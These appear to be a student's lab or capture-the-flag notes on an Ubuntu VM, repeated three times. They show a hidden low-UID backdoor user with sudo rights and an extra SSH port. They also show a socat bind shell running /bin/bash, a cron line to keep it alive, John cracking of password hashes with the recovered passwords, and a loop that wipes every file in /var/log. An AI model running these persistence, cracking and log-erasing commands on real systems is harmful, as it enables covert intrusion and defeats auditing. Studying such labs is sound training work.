root@ubuntu-headless:~# useradd sysd
root@ubuntu-headless:/home# cd sysd
bash: cd: sysd: No such file or directory
==============================================================================================================================
root@ubuntu-headless:~# passwd sysd
Enter new UNIX password: cybersecurity
Retype new UNIX password: cybersecurity
passwd: password updated successfully
==============================================================================================================================
usermod -u 51 sysd
==============================================================================================================================
root@ubuntu-headless:~# groupmod -g 51 sysd
root@ubuntu-headless:~# cat /etc/passwd | grep "sysd"
sysd:x:51:51::/home/sysd:/bin/sh
==============================================================================================================================
root@ubuntu-headless:/home/student# cat /etc/sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
vagrant ALL=(ALL) NOPASSWD:ALL
sysadmin  ALL=(ALL:ALL) /usr/bin/less
sysd ALL=(ALL:ALL) /usr/bin/less
==============================================================================================================================
root@ubuntu-headless:/home# ls
babbage  lovelace  mitnik  stallman  student  sysadmin  turing  vagrant
==============================================================================================================================
Open Port 2222

#       $OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

Port 22
Port 2222

root@ubuntu-headless:/home/student# netstat -ntlp | grep LISTEN
tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN      4920/sshd
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      861/systemd-resolve
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      4920/sshd
tcp6       0      0 :::2222                 :::*                    LISTEN      4920/sshd
tcp6       0      0 :::22                   :::*                    LISTEN      4920/sshd
==============================================================================================================================
Test your solution:
1-Noting the IP address of the system
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.104.137  netmask 255.255.255.240  broadcast 172.17.104.143
        inet6 fe80::215:5dff:fe00:400  prefixlen 64  scopeid 0x20<link>
        ether 00:15:5d:00:04:00  txqueuelen 1000  (Ethernet)
        RX packets 7536  bytes 7845343 (7.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2066  bytes 305234 (305.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 120  bytes 9578 (9.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 120  bytes 9578 (9.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
===================================================================================
2-Exiting the root account, and logging off of the machine
root@ubuntu-headless:/home/student# exit
exit
student:~\ $ logout
Connection to 172.17.104.137 closed.
===================================================================================
3-Using your local command line to SSH into the system as your sysd user
azadmin@ML-RefVm-645952 MINGW64 /usr/bin
$ ssh sysd@172.17.104.137 -p 2222
sysd@172.17.104.137's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-91-generic x86_64)
===================================================================================
azadmin@ML-RefVm-645952 MINGW64 /usr/bin
$ ssh sysd@172.17.104.137 -p 22
sysd@172.17.104.137's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-91-generic x86_64)
===================================================================================
Once you are connected over SSH, use sudo to switch back to the root user.
$ su root
Password:

You found flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0

root@ubuntu-headless:/#
=======================================================================================================================================
After reading the article, install socat and use the following command to open a Listener: socat TCP4-Listen:3177,fork EXEC:/bin/bash

the exact distribution terms for each program are described in the
root@ubuntu-headless:/# socat

Command 'socat' not found, but can be installed with:

apt install socat

root@ubuntu-headless:/# apt install socat
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following package was automatically installed and is no longer required:
  linux-headers-4.15.0-70
Use 'apt autoremove' to remove it.
The following NEW packages will be installed:
  socat
0 upgraded, 1 newly installed, 0 to remove and 67 not upgraded.
Need to get 342 kB of archives.
After this operation, 1,034 kB of additional disk space will be used.
Get:1 http://us.archive.ubuntu.com/ubuntu bionic/main amd64 socat amd64 1.7.3.2-2ubuntu2 [342 kB]
Fetched 342 kB in 8s (42.1 kB/s)
Selecting previously unselected package socat.
(Reading database ... 134029 files and directories currently installed.)
Preparing to unpack .../socat_1.7.3.2-2ubuntu2_amd64.deb ...
Unpacking socat (1.7.3.2-2ubuntu2) ...
Setting up socat (1.7.3.2-2ubuntu2) ...
Processing triggers for man-db (2.8.3-2ubuntu0.1) ...
===================================================================================
Listener: socat TCP4-Listen:3177,fork EXEC:/bin/bash
socat TCP-LISTEN:80,fork TCP:202.54.1.5:80

socat STDIO TCP4:<Your-VM-IP-address>:3177 
socat STDIO TCP4:172.17.104.137:3177 
ssh sysd@172.17.104.137 -p 2222

=======================================================================================================================================
root@ubuntu-headless:~# useradd sysd
==============================================================================================================================
root@ubuntu-headless:~# passwd sysd
Enter new UNIX password: cybersecurity
Retype new UNIX password: cybersecurity
passwd: password updated successfully
==============================================================================================================================
usermod -u 51 sysd
==============================================================================================================================
root@ubuntu-headless:~# groupmod -g 51 sysd
root@ubuntu-headless:~# cat /etc/passwd | grep "sysd"
sysd:x:51:51::/home/sysd:/bin/sh
==============================================================================================================================
root@ubuntu-headless:/home/student# cat /etc/sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
vagrant ALL=(ALL) NOPASSWD:ALL
sysadmin  ALL=(ALL:ALL) /usr/bin/less
sysd ALL=(ALL:ALL) /usr/bin/less
==============================================================================================================================
root@ubuntu-headless:/home# ls
babbage  lovelace  mitnik  stallman  student  sysadmin  turing  vagrant
==============================================================================================================================
Open Port 2222

#       $OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

Port 22
Port 2222

root@ubuntu-headless:/home/student# netstat -ntlp | grep LISTEN
tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN      4920/sshd
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      861/systemd-resolve
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      4920/sshd
tcp6       0      0 :::2222                 :::*                    LISTEN      4920/sshd
tcp6       0      0 :::22                   :::*                    LISTEN      4920/sshd
==============================================================================================================================
Test your solution:
1-Noting the IP address of the system
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.104.137  netmask 255.255.255.240  broadcast 172.17.104.143
        inet6 fe80::215:5dff:fe00:400  prefixlen 64  scopeid 0x20<link>
        ether 00:15:5d:00:04:00  txqueuelen 1000  (Ethernet)
        RX packets 7536  bytes 7845343 (7.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2066  bytes 305234 (305.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 120  bytes 9578 (9.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 120  bytes 9578 (9.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
===================================================================================
2-Exiting the root account, and logging off of the machine
root@ubuntu-headless:/home/student# exit
exit
student:~\ $ logout
Connection to 172.17.104.137 closed.
===================================================================================
3-Using your local command line to SSH into the system as your sysd user
azadmin@ML-RefVm-645952 MINGW64 /usr/bin
$ ssh sysd@172.17.104.137 -p 2222
sysd@172.17.104.137's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-91-generic x86_64)
===================================================================================
azadmin@ML-RefVm-645952 MINGW64 /usr/bin
$ ssh sysd@172.17.104.137 -p 22
sysd@172.17.104.137's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-91-generic x86_64)
===================================================================================
Once you are connected over SSH, use sudo to switch back to the root user.
$ su root
Password:

You found flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0

root@ubuntu-headless:/#
=======================================================================================================================================
After reading the article, install socat and use the following command to open a Listener: socat TCP4-Listen:3177,fork EXEC:/bin/bash

the exact distribution terms for each program are described in the
root@ubuntu-headless:/# socat

Command 'socat' not found, but can be installed with:

apt install socat

root@ubuntu-headless:/# apt install socat
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following package was automatically installed and is no longer required:
  linux-headers-4.15.0-70
Use 'apt autoremove' to remove it.
The following NEW packages will be installed:
  socat
0 upgraded, 1 newly installed, 0 to remove and 67 not upgraded.
Need to get 342 kB of archives.
After this operation, 1,034 kB of additional disk space will be used.
Get:1 http://us.archive.ubuntu.com/ubuntu bionic/main amd64 socat amd64 1.7.3.2-2ubuntu2 [342 kB]
Fetched 342 kB in 8s (42.1 kB/s)
Selecting previously unselected package socat.
(Reading database ... 134029 files and directories currently installed.)
Preparing to unpack .../socat_1.7.3.2-2ubuntu2_amd64.deb ...
Unpacking socat (1.7.3.2-2ubuntu2) ...
Setting up socat (1.7.3.2-2ubuntu2) ...
Processing triggers for man-db (2.8.3-2ubuntu0.1) ...
===================================================================================
Listener: socat TCP4-Listen:3177,fork EXEC:/bin/bash
socat TCP-LISTEN:80,fork TCP:202.54.1.5:80

socat STDIO TCP4:<Your-VM-IP-address>:3177 
socat STDIO TCP4:172.17.104.137:3177 
ssh sysd@172.17.104.137 -p 2222

=======================================================================================================================================
root@ubuntu-headless:~# useradd sysd
==============================================================================================================================
root@ubuntu-headless:~# passwd sysd
Enter new UNIX password: cybersecurity
Retype new UNIX password: cybersecurity
passwd: password updated successfully
==============================================================================================================================
usermod -u 51 sysd
==============================================================================================================================
root@ubuntu-headless:~# groupmod -g 51 sysd
root@ubuntu-headless:~# cat /etc/passwd | grep "sysd"
sysd:x:51:51::/home/sysd:/bin/sh
==============================================================================================================================
root@ubuntu-headless:/home/student# cat /etc/sudoers
#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
vagrant ALL=(ALL) NOPASSWD:ALL
sysadmin  ALL=(ALL:ALL) /usr/bin/less
sysd ALL=(ALL) NOPASSWD:ALL
==============================================================================================================================
root@ubuntu-headless:/home# ls
babbage  lovelace  mitnik  stallman  student  sysadmin  turing  vagrant
==============================================================================================================================
Open Port 2222

#       $OpenBSD: sshd_config,v 1.101 2017/03/14 07:19:07 djm Exp $

# This is the sshd server system-wide configuration file.  See
# sshd_config(5) for more information.

# This sshd was compiled with PATH=/usr/bin:/bin:/usr/sbin:/sbin

# The strategy used for options in the default sshd_config shipped with
# OpenSSH is to specify options with their default value where
# possible, but leave them commented.  Uncommented options override the
# default value.

Port 22
Port 2222

root@ubuntu-headless:/home/student# netstat -ntlp | grep LISTEN
tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN      4920/sshd
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      861/systemd-resolve
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      4920/sshd
tcp6       0      0 :::2222                 :::*                    LISTEN      4920/sshd
tcp6       0      0 :::22                   :::*                    LISTEN      4920/sshd
==============================================================================================================================
Test your solution:
1-Noting the IP address of the system
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.104.137  netmask 255.255.255.240  broadcast 172.17.104.143
        inet6 fe80::215:5dff:fe00:400  prefixlen 64  scopeid 0x20<link>
        ether 00:15:5d:00:04:00  txqueuelen 1000  (Ethernet)
        RX packets 7536  bytes 7845343 (7.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2066  bytes 305234 (305.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 120  bytes 9578 (9.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 120  bytes 9578 (9.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
===================================================================================
2-Exiting the root account, and logging off of the machine
root@ubuntu-headless:/home/student# exit
exit
student:~\ $ logout
Connection to 172.17.104.137 closed.
===================================================================================
3-Using your local command line to SSH into the system as your sysd user
azadmin@ML-RefVm-645952 MINGW64 /usr/bin
$ ssh sysd@172.17.104.137 -p 2222
sysd@172.17.104.137's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-91-generic x86_64)
===================================================================================
azadmin@ML-RefVm-645952 MINGW64 /usr/bin
$ ssh sysd@172.17.104.137 -p 22
sysd@172.17.104.137's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-91-generic x86_64)
===================================================================================
Once you are connected over SSH, use sudo to switch back to the root user.
$ su root
Password:

You found flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0

root@ubuntu-headless:/#
=======================================================================================================================================
After reading the article, install socat and use the following command to open a Listener: socat TCP4-Listen:3177,fork EXEC:/bin/bash

the exact distribution terms for each program are described in the
root@ubuntu-headless:/# socat

Command 'socat' not found, but can be installed with:

apt install socat

root@ubuntu-headless:/# apt install socat
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following package was automatically installed and is no longer required:
  linux-headers-4.15.0-70
Use 'apt autoremove' to remove it.
The following NEW packages will be installed:
  socat
0 upgraded, 1 newly installed, 0 to remove and 67 not upgraded.
Need to get 342 kB of archives.
After this operation, 1,034 kB of additional disk space will be used.
Get:1 http://us.archive.ubuntu.com/ubuntu bionic/main amd64 socat amd64 1.7.3.2-2ubuntu2 [342 kB]
Fetched 342 kB in 8s (42.1 kB/s)
Selecting previously unselected package socat.
(Reading database ... 134029 files and directories currently installed.)
Preparing to unpack .../socat_1.7.3.2-2ubuntu2_amd64.deb ...
Unpacking socat (1.7.3.2-2ubuntu2) ...
Setting up socat (1.7.3.2-2ubuntu2) ...
Processing triggers for man-db (2.8.3-2ubuntu0.1) ...
===================================================================================
Listener: socat TCP4-Listen:3177,fork EXEC:/bin/bash
socat TCP-LISTEN:80,fork TCP:202.54.1.5:80

socat STDIO TCP4:<Your-VM-IP-address>:3177 
socat STDIO TCP4:172.17.104.137:3177 

===================================================================================
socat TCP4-Listen:3177,fork EXEC:/bin/bash &
* * * * * socat TCP4-Listen:3177,fork EXEC:/bin/bash &


OPENSSL-LISTEN:<port>
              Listens on tcp <port> [TCP service].  The IP version is 4 or the one specified with
              pf. When a connection is accepted, this address behaves as SSL server.
              Note: You probably want to use the certificate option with this address.
              NOTE: The client certificate is only checked for validity against cafile or capath,
              but not for match with the client’s name or its IP address!
              Option groups: FD,SOCKET,IP4,IP6,TCP,LISTEN,OPENSSL,CHILD,RANGE,RETRY
              Useful options: pf, cipher, method, verify, commonname cafile, capath, certificate,
              key, compress, fork, bind, range, tcpwrap, su, reuseaddr, retry
              See also: OPENSSL, TCP-LISTEN
              
EXEC:/bin/myscript,chroot=/home/sandbox,su-d=sandbox,pty,stderr

              a  simple  server  that  accepts  connections  (TCP4-LISTEN) and fork’s a new child
              process for each connection; every child acts as single  relay.   The  client  must
              match   the  rules  for  daemon  process  name  "script"  in  /etc/hosts.allow  and
              /etc/hosts.deny, otherwise it is refused access (see "man  5  hosts_access").   For
              EXEC’uting  the  program, the child process chroot’s to /home/sandbox, su’s to user
              sandbox, and then starts the program /home/sandbox/bin/myscript. Socat and myscript
              communicate  via  a pseudo tty (pty); myscript’s stderr is redirected to stdout, so
              its error messages are transferred via socat to the connected client.

&           run command in the background
=======================================================================================================================================
socat STDIO TCP4:172.17.104.137:3177
=======================================================================================================================================
Crack all the things
Use John to crack the entire /etc/shadow file.
john /etc/passwd >> cracked.txt
root@ubuntu-headless:~/.john# cat john.pot
$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0:challenge.
$1$Qbq.XLLp$oj.BXuxR2q99bJwNEFhSH1:cyber
$1$zuzYyKCN$secHwYBXIELGqOv8rWzG00:this
$1$WYmnR327$5C1yY4flBxB1cLjkc92Tq.:Congratulations
$1$PEDICYq8$6/U/a5Ykxw1OP0.eSrMZO0:You
$1$lGQ7QprJ$m4eE.b8jhvsp8CNbuIF5U0:completed
$5$iqkyXnunys8fudo8$V.2CfJLVvcMm3hSfUqDVH42P9kAsOE7G42k9qG5mTs/:computer
$5$P3977aBF1$b52peRg4Nupjf2kvRuFISlhyAViMEJHjA4o7q8XRZQ/:freedom
$5$LHar57iiBOQmb$ORtoOfL0dTTCrrPKboKjH9oJlSavagNEU4lYTujWIh5:trustno1
$5$BgoBo0WQIFKPfRv.$syUWKUtzoJgfGbQML9zDZmlKPo6joRi8wVhB3BWAWq9:dragon
$5$Jp9SDAc1n1pP1ZI$1WG.XmbA5nxapYdGrmZ5dVl8ccRypZvxYimu3IaB139:lakers
$5$ClxpOL1OCPV$wG5s1DiVgsC2Ye34aFSI0LzABPompLu9DP34ZztvgR6:passw0rd
$5$rBGTrqC2$1mzzT7PXXjy.tigztzQgTTkcMZmZaAxiN9GRLE1Qhv6:Goodluck!
=======================================================================================================================================
Bonus: Cover your tracks
for i in /var/log/*; do >$i; done
=======================================================================================================================================















